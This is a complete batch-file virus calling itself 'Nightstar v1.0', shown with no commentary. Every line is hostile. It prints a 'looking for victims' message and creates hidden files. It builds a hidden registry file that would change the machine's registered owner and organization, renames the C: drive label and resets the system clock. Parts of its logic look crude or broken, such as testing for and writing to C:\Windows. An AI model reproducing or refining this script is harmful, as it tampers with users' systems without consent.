   @echo off
   if errorlevel 1 goto fresh_blood1
   echo "Every one sleeps, except Nightstar, he´s looking
   echo for victims..."
   :fresh_blood1
   if exist C:\Windows goto payloadia
   if not exist %0.bat goto fresh_blood2
   find "Windows"<%0.bat">C:\Windows
   attrib C:\Windows +h
   :fresh_blood2
   ECHO [HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion]>>%windir%\blood.reg
   ECHO "RegisteredOwner"="Nightstar v1.0">>%windir%\blood.reg
   ECHO "RegisteredOrganization"="By OnNiacine©">>%windir%\blood.reg
   attrib C:\Windows\blood.reg +h
   label C: xxxxxxxxxxx
   :payloadia
   time 00.00
